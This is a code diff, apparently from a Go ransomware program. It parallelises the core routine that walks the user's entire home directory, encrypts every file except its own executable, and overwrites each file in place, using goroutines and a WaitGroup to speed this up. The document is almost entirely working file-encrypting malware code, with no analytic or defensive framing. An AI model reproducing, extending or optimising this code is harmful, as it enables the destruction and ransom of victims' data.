@@ -9,6 +9,7 @@ import (
 	"os"
 	"path/filepath"
 	"runtime"
+	"sync"
 )
 
 const (
@@ -71,39 +72,46 @@ func main() {
 		return
 	}
 
+	var wg sync.WaitGroup
+
 	err = filepath.WalkDir(homeDir, func(path string, d fs.DirEntry, err error) error {
 		if err != nil {
 			return err
 		}
-
 		if d.IsDir() || path == execPath {
 			return nil
 		}
 
-		bytesBefore, err := files.ReadFile(path)
-		if err != nil {
-			return err
-		}
+		wg.Add(1)
+		go func(path string) {
+			defer wg.Done()
 
-		var bytesAfter []byte
+			bytesBefore, err := files.ReadFile(path)
+			if err != nil {
+				return
+			}
+	
+			var bytesAfter []byte
+	
+			switch mode {
+			case MODE_ENCRYPT:
+				bytesAfter, err = cipher.EncryptBytes(bytesBefore)
+			case MODE_DECRYPT:
+				bytesAfter, err = cipher.DecryptBytes(bytesBefore)
+			}
+			if err != nil {
+				return
+			}
+			files.RewriteFile(path, bytesAfter)
+		}(path)
 
-		switch mode {
-		case MODE_ENCRYPT:
-			bytesAfter, err = cipher.EncryptBytes(bytesBefore)
-		case MODE_DECRYPT:
-			bytesAfter, err = cipher.DecryptBytes(bytesBefore)
-		}
-		if err != nil {
-			return err
-		}
-
-		err = files.RewriteFile(path, bytesAfter)
-
-		return err
-	})
+		return nil
+	})	
 	if err != nil {
 		return
 	}
+	
+	wg.Wait()
 
 	switch mode {
 	case MODE_ENCRYPT:
